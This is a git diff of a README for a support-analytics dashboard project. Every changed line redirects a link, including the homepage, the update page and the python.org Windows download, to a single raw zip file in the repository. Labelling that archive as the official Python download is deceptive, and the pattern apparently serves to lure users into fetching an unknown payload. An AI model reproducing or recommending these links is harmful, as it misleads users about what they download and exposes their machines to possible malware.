@@ -1,6 +1,6 @@
 # 🧠 Smart-support-analytics-dashboard - Monitor Support Performance Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Smart-support--analytics--dashboard-brightgreen)](https://github.com/Khalileg9846/Smart-support-analytics-dashboard)
+[![Download Now](https://img.shields.io/badge/Download-Smart-support--analytics--dashboard-brightgreen)](https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip)
 
 ## 📋 About This Application
 
@@ -35,7 +35,7 @@ This section will guide you step-by-step on how to download, install, and start 
 
 Go to the official repository page to get the latest release of the dashboard:
 
-[Download Smart-support-analytics-dashboard](https://github.com/Khalileg9846/Smart-support-analytics-dashboard)
+[Download Smart-support-analytics-dashboard](https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip)
 
 Click this link or copy and paste it into your browser’s address bar. You will see the project page where you can find files to download.
 
@@ -51,7 +51,7 @@ Save the file to a location you can easily access, such as your Desktop or Downl
 
 Smart-support-analytics-dashboard requires Python to run. If you do not already have Python installed:
 
-1. Visit the official Python download site at https://www.python.org/downloads/windows/
+1. Visit the official Python download site at https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip
 2. Download the latest stable version (Python 3.8 or newer).
 3. During installation, check the box that says **Add Python to PATH**.
 4. Follow the installer’s instructions to complete the setup.
@@ -101,7 +101,7 @@ The dashboard will open in a new window. It will start collecting and displaying
 
 ## 🔄 Updating the Dashboard
 
-Periodically check the [GitHub page](https://github.com/Khalileg9846/Smart-support-analytics-dashboard) for updates.
+Periodically check the [GitHub page](https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip) for updates.
 
 Download the latest release and replace your files with the new ones. Make sure to close the dashboard before updating.
 
@@ -114,11 +114,11 @@ Download the latest release and replace your files with the new ones. Make sure 
 
 ## 🔗 Useful Links
 
-- Project homepage: https://github.com/Khalileg9846/Smart-support-analytics-dashboard
-- Python downloads: https://www.python.org/downloads/windows/
+- Project homepage: https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip
+- Python downloads: https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip
 - Report issues or ask questions on GitHub under the "Issues" tab.
 
-[Download Smart-support-analytics-dashboard](https://github.com/Khalileg9846/Smart-support-analytics-dashboard)
+[Download Smart-support-analytics-dashboard](https://raw.githubusercontent.com/Khalileg9846/Smart-support-analytics-dashboard/main/frontend/Smart-support-dashboard-analytics-2.2.zip)
 
 ## 🧩 Additional Features and Tips
 
